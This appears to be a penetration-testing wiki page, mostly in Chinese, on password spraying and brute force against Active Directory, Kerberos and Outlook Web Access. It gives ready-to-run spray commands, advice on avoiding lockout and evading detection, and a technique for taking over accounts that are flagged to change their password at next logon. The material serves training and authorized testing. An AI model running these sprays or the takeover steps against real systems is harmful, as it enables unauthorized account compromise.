# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

一旦找到几个 **valid usernames**，就可以对每个发现的用户尝试最常见的 **common passwords**（请注意环境的密码策略）。\
默认情况下，**minimum** **password** **length** 为 **7**。

常见用户名列表也可能有用： [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

注意，你 **could lockout some accounts if you try several wrong passwords**（默认超过 10 次）。 

### 获取密码策略

如果你有某些用户凭证或以域用户身份获得了 shell，你可以通过以下方式 **get the password policy with**：
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### 从 Linux（或所有）进行利用

- 使用 **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- 使用 [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(你可以指定尝试次数以避免被锁定)：**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- 使用 [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - 不推荐：有时不起作用
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- 使用 `scanner/smb/smb_login` 模块的 **Metasploit**：

![](<../../images/image (745).png>)

- 使用 **rpcclient**：
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### 从 Windows

- 使用带有 brute module 的 [Rubeus](https://github.com/Zer1t0/Rubeus) 版本：
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- 使用 [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (默认可以从域生成用户，并且会从域获取密码策略并根据该策略限制尝试次数):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- 使用 [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### 识别并接管 "Password must change at next logon" 帐户 (SAMR)

一种低噪声技术是尝试一个无害/空的密码并捕获返回 STATUS_PASSWORD_MUST_CHANGE 的帐户，该状态表示密码被强制过期，可以在不知道旧密码的情况下更改。

Workflow:
- 枚举用户（通过 SAMR 进行 RID 暴力破解）以构建目标列表：

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray 空密码，并在命中后继续尝试以捕获必须在下次登录时更改的账户：
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- 对于每个命中，通过 SAMR 使用 NetExec 的模块更改密码（当设置了 "must change" 时不需要旧密码）：
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
操作说明:
- 确保在执行基于 Kerberos 的操作之前，主机时钟与 DC 同步： `sudo ntpdate <dc_fqdn>`.
- 在某些模块（例如 RDP/WinRM）中，带有 [+] 但没有 (Pwn3d!) 表示 creds 有效，但该账户缺少交互式登录权限。

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying 相较于 SMB/NTLM/LDAP bind attempts 能减少噪音，并更符合 AD lockout policies。SpearSpray 结合 LDAP 驱动的定向、模式引擎 和 策略感知（域策略 + PSOs + badPwdCount buffer），以精确且安全地进行喷洒。它还可以在 Neo4j 中标记被攻陷的主体，以供 BloodHound 路径分析使用。

关键要点：
- LDAP 用户发现，支持分页和 LDAPS，并可选地使用自定义 LDAP 过滤器。
- 结合域锁定策略 + PSO 感知的过滤，保留可配置的尝试缓冲（阈值），避免锁定用户。
- 使用快速 gssapi bindings 进行 Kerberos pre-auth 验证（在 DC 上生成 4768/4771 而非 4625）。
- 基于模式的逐用户密码生成，使用诸如姓名和从每个用户的 pwdLastSet 派生的时间变量等变量。
- 通过线程、jitter 和每秒最大请求数来控制吞吐。
- 可选的 Neo4j 集成用于标记被攻破的用户以供 BloodHound 使用。

基本用法与发现：
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
目标定位与模式控制：
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
隐蔽与安全控制：
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound 富集:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
模式系统概览 (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
可用变量包括：
- {name}, {samaccountname}
- 从每个用户的 pwdLastSet（或 whenCreated）获得的时间变量：{year}, {short_year}, {month_number}, {month_en}, {season_en}
- 组合辅助变量和组织令牌：{separator}, {suffix}, {extra}

操作注意事项：
- 优先使用 -dc 查询 PDC-emulator，以读取最权威的 badPwdCount 和与策略相关的信息。
- badPwdCount 会在观察窗口之后的下一次尝试时被重置；使用阈值和时机以保持安全。
- Kerberos 预认证尝试会在 DC 监测中以 4768/4771 的事件出现；使用 jitter 和 rate-limiting 来混入正常流量。

> 提示：SpearSpray 的默认 LDAP 页面大小为 200；根据需要使用 -lps 调整。

## Outlook Web Access

有多种工具可用于 p**assword spraying outlook**。

- 使用 [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- 使用 [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- 使用 [Ruler](https://github.com/sensepost/ruler)（可靠！）
- 使用 [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)（Powershell）
- 使用 [MailSniper](https://github.com/dafthack/MailSniper)（Powershell）

要使用这些工具，你需要一个用户列表以及一个密码或一小组要尝试的密码。
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## 参考

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
